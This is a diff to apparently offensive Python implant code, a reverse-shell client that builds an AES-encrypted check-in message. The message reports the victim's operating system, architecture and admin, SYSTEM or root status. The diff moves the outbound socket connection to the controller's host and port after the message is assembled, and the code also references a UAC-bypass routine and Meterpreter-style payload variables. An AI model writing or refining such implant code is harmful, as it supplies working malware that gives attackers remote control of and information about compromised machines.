@@ -142,6 +142,9 @@ cipher = AES.new(secret,AES.MODE_CFB, iv)
 MeterBin, DropSock, is64 = None, None, False
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 isAdmin, isSystem, is64 = False, False, False
+opsys = platform.uname()[0] + ' ' + platform.uname()[2]
+paddedopsys = opsys + '*' * (64 - len(opsys))
+starpadding = '*' * 16
 
 if platform.machine()[-2:] == '64':
 	is64 = True
@@ -199,17 +202,7 @@ if os.name == 'nt':
 			rcmd = tempvbs + ' ' + tempbat
 			fbypass(rcmd)
 			exit()
-else:
-	if os.getuid() == 0:
-		isSystem = True
-	pwdvar = 'pwd'
-
-s.connect((host, port))
-opsys = platform.uname()[0] + ' ' + platform.uname()[2]
-paddedopsys = opsys + '*' * (64 - len(opsys))
-starpadding = '*' * 16
-
-if os.name == 'nt':
+	
 	if is64:
 		if isSystem:
 			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOSY%s' % (paddedopsys, starpadding))
@@ -226,7 +219,11 @@ if os.name == 'nt':
 				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOAH%s' % (paddedopsys, starpadding))
 			else:
 				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOFH%s' % (paddedopsys, starpadding))
+
 elif os.name == 'posix':
+	if os.getuid() == 0:
+		isSystem = True
+	pwdvar = 'pwd'
 	if isSystem:
 		if is64:
 			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFESLY%s' % (paddedopsys, starpadding))
@@ -237,9 +234,12 @@ elif os.name == 'posix':
 			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLY%s' % (paddedopsys, starpadding))
 		else:
 			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLH%s' % (paddedopsys, starpadding))
+	
 else:
+	pwdvar = 'pwd'
 	success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOUH%s' % (paddedopsys, starpadding))
 
+s.connect((host, port))
 s.send(success)
 pwd = fsubprocess(pwdvar).strip('**n').strip('**r')
 
